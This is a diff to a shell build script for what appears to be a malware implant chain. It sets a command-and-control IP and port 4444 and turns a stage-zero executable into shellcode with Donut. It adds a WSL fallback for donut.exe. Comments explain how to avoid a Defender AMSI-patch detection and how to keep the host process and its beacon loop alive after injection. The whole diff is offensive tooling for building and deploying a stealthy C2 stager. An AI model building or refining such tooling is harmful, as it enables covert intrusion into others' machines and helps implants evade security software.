@@ -24,7 +24,7 @@
 set -euo pipefail
 
 # ---- Parse arguments ----
-C2_IP="CHANGEME_C2_HOST"
+C2_IP="192.168.2.7"
 C2_PORT="4444"
 API_PORT="5555"
 PRODUCTION=0
@@ -76,7 +76,7 @@ echo "   → ${EXE_PATH} (${EXE_SIZE} KB)"
 echo ""
 echo "[2/4] Converting to PIC shellcode with Donut..."
 
-# Find donut — native binary first, then wine fallback
+# Find donut — native binary first, then direct Windows EXE (WSL interop), then wine fallback
 DONUT_CMD=""
 
 # 1. Native Linux donut binary
@@ -89,6 +89,17 @@ for candidate in \
         break
     fi
 done
+
+# 1b. WSL interop: run donut.exe directly (WSL can run Windows executables transparently)
+DONUT_WIN_INTEROP=false
+if [ -z "${DONUT_CMD}" ]; then
+    DONUT_EXE_WIN="${REPO_ROOT}/donut_v1.1/donut.exe"
+    if [ -f "${DONUT_EXE_WIN}" ]; then
+        echo "   ℹ️  Using donut.exe via WSL Windows interop"
+        DONUT_CMD="${DONUT_EXE_WIN}"
+        DONUT_WIN_INTEROP=true
+    fi
+fi
 
 # 2. Wine wrapper around the bundled donut.exe
 if [ -z "${DONUT_CMD}" ]; then
@@ -114,16 +125,30 @@ if [ -z "${DONUT_CMD}" ]; then
 fi
 
 SC_PATH="${SCRIPT_DIR}/build/stage0_lite.bin"
+
+# When using Windows donut.exe via WSL interop, it expects Windows-style paths
+if [ "${DONUT_WIN_INTEROP}" = true ]; then
+    DONUT_INPUT_PATH="$(wslpath -w "${EXE_PATH}")"
+    DONUT_OUTPUT_PATH="$(wslpath -w "${SC_PATH}")"
+else
+    DONUT_INPUT_PATH="${EXE_PATH}"
+    DONUT_OUTPUT_PATH="${SC_PATH}"
+fi
+
 # shellcheck disable=SC2086
 # -b 1 = No AMSI/WLDP bypass: stage0_lite.exe is a native C PE (not .NET),
 # AMSI patching is unnecessary and triggers Behavior:Win32/AMSI_Patch_T.B12
+# -x 1 = ExitThread (NOT ExitProcess). stage0-lite is called directly by
+# JAVELIN on a CreateThread'd thread inside ESTER. Using -x 2 would call
+# ExitProcess after stage0-lite's main() returns, killing ESTER and the
+# agent beacon loop. -x 1 exits only the JAVELIN thread; ESTER lives on.
 ${DONUT_CMD} \
-    -i "${EXE_PATH}" \
-    -o "${SC_PATH}" \
+    -i "${DONUT_INPUT_PATH}" \
+    -o "${DONUT_OUTPUT_PATH}" \
     -a 2  \
     -f 1  \
     -b 1  \
-    -x 2  \
+    -x 1  \
     -e 3  \
     -t
 
